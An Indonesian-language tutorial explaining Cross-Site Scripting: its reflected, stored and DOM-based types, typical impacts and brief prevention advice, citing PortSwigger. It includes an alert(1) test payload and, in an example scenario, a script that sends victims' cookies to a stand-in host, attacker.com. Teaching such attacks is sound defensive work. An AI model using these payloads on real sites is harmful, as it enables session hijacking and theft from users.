# Konsep: Cross-Site Scripting (XSS)

## Apa itu Cross-Site Scripting (XSS)?

Cross-Site Scripting (XSS) adalah celah keamanan pada aplikasi web yang memungkinkan penyerang menyisipkan script (biasanya JavaScript) ke dalam halaman yang dilihat oleh pengguna lain. Celah ini pada dasarnya mengeksploitasi kepercayaan yang diberikan browser terhadap konten yang berasal dari sebuah situs, sehingga *same-origin policy* — mekanisme yang seharusnya memisahkan satu situs dari situs lain — bisa dilewati.

Dengan XSS, penyerang bisa menyamar sebagai korban di dalam aplikasi, menjalankan aksi apa pun yang bisa dilakukan korban, serta mengakses data yang dimiliki korban. Jika akun korban memiliki hak akses tinggi (misalnya admin), dampaknya bisa meluas hingga penyerang mengambil alih seluruh fungsi dan data aplikasi.

## Bagaimana Cara Kerjanya?

Secara umum, XSS terjadi ketika sebuah aplikasi memasukkan input yang tidak tepercaya ke dalam halaman yang dikirim ke browser tanpa proses penyaringan atau *encoding* yang memadai. Ketika browser korban merender halaman tersebut, script yang disisipkan penyerang ikut dieksekusi seolah-olah itu bagian sah dari situs, sehingga penyerang bisa mengendalikan interaksi korban dengan aplikasi.

Ada tiga jenis utama XSS:

**1. Reflected XSS**
Payload berasal dari request HTTP itu sendiri (misalnya parameter di URL) dan langsung dipantulkan kembali ke response tanpa disaring. Contoh sederhana:
```
https://contoh-situs.com/status?message=<script>alert(1)</script>
```
Jika parameter `message` ditampilkan mentah-mentah di halaman, script tersebut akan langsung tereksekusi saat korban membuka link ini.

**2. Stored XSS (Persistent XSS)**
Payload disimpan terlebih dahulu di server — misalnya di database melalui kolom komentar, nama pengguna, atau pesan chat — lalu ditampilkan kembali ke pengguna lain setiap kali halaman tersebut dibuka. Jenis ini umumnya lebih berbahaya karena bisa menyerang banyak korban tanpa perlu mengirim link khusus.

**3. DOM-based XSS**
Celah terjadi murni di sisi client, di dalam kode JavaScript aplikasi itu sendiri. Data yang tidak tepercaya (misalnya dari `location.search`, `document.referrer`, atau input pengguna) diproses dan ditulis kembali ke DOM (contohnya lewat `innerHTML`) tanpa validasi, sehingga penyerang bisa menyisipkan markup atau atribut event handler berbahaya.

## Dampak

Dampak XSS sangat bergantung pada konteks aplikasi, jenis data yang dikelola, dan hak akses pengguna yang berhasil dikompromikan. Beberapa contoh dampak yang umum terjadi:

- Pengambilalihan sesi/akun dengan mencuri cookie atau token sesi korban
- Pencurian kredensial login melalui form palsu yang disisipkan ke halaman
- Eksekusi aksi atas nama korban tanpa sepengetahuannya (mengubah data, mengirim pesan, dsb.)
- Perusakan tampilan situs (*defacement*)
- Penyisipan fungsi berbahaya (trojan) ke dalam halaman yang dilihat pengguna lain
- Jika korban adalah admin/pengguna dengan privilese tinggi, penyerang berpotensi mengambil alih seluruh aplikasi

Pada aplikasi tanpa data sensitif (misalnya situs informatif publik), dampaknya cenderung minim. Namun pada aplikasi yang menangani data sensitif seperti transaksi keuangan, email, atau rekam medis, dampaknya bisa sangat serius.

## Contoh Skenario

Sebuah forum diskusi memiliki fitur komentar yang menampilkan input pengguna apa adanya:

```html
<p>Halo, ini komentar saya!</p>
```

Karena aplikasi tidak melakukan sanitasi/encoding terhadap input, penyerang bisa mengirim komentar berisi script:

```html
<p><script>document.location='https://attacker.com/steal?c='+document.cookie</script></p>
```

Setiap pengguna yang membuka halaman komentar tersebut akan otomatis menjalankan script itu di browser mereka, dan cookie sesi mereka terkirim ke server milik penyerang — yang kemudian bisa digunakan untuk membajak sesi login korban.

**Pencegahan singkat:** validasi/filter input saat diterima, lakukan output encoding sesuai konteks (HTML, JS, URL, CSS), gunakan header respons yang tepat (`Content-Type`, `X-Content-Type-Options`), dan terapkan Content Security Policy (CSP) sebagai lapisan pertahanan tambahan.

---
*Referensi: PortSwigger Web Security Academy — Cross-site scripting*
